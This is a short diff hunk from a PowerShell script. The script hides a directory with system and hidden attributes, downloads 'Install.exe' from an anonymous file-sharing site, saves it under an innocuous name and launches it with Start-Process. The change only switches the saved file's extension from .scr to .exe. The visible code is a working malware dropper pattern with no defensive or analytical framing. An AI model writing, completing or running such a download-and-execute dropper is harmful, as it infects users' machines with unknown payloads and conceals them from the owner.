@@ -13,6 +13,6 @@ attrib +h +s $dir
 
 
 $url = "https://anonsharing.com/file/194e218797374600/Install.exe"
-$output = "$dir\skibidi.scr"
+$output = "$dir\skibidi.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
